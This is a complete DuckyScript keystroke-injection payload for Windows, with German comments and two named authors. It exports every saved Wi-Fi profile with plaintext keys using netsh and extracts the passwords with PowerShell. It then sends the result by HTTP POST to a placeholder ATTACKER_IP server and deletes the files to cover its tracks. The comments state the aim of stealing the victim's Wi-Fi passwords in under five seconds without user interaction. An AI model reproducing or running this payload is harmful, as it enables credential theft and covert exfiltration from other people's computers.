REM  Autoren: Raphael Bleier, Joachim Lugger
REM  Ziel-OS: Windows
REM  Angriffsziel: Gespeicherte WLAN-Passwörter exfiltrieren
REM  Beschreibung: Exportiert alle WLAN-Profile mit Klartext-
REM                Passwörtern und sendet sie an Angreifer-Server
REM
REM  Voraussetzung: Python-Server läuft auf ATTACKER_IP:8080
REM  Ersetze ATTACKER_IP mit der echten IP-Adresse!
REM
REM  Ziel definiert: WLAN-Passwörter des Opfer-Systems stehlen
REM  Warum RD: Angriff läuft in <5 Sekunden, kein Benutzer-
REM            eingriff nötig, funktioniert auf gesperrtem(!)
REM            System falls kein Autolock aktiv
REM ============================================================

DELAY 2000

GUI r
DELAY 500

REM Minimiertes CMD öffnen
STRINGLN cmd /k mode con: cols=15 lines=1
DELAY 800

REM Temp-Verzeichnis, WLAN-Profile exportieren (mit Klartextkeys!)
STRINGLN cd %TEMP%
DELAY 300
STRINGLN netsh wlan export profile key=clear
DELAY 1500

REM Passwörter aus den XML-Dateien extrahieren
STRINGLN powershell "Select-String -Path Wi*.xml -Pattern 'keyMaterial' | ForEach-Object {$_.Line} | Out-File -FilePath WiFi-PASS.txt"
DELAY 1500

REM Ergebnis per HTTP exfiltrieren
STRINGLN powershell "Invoke-WebRequest -Uri 'http://ATTACKER_IP:8080/collect' -Method POST -InFile WiFi-PASS.txt -UseBasicParsing"
DELAY 3000

REM Spuren verwischen: XML-Profile und Passwort-Datei löschen
STRINGLN del Wi*.xml /f /q
DELAY 300
STRINGLN del WiFi-PASS.txt /f /q
DELAY 300
STRINGLN exit
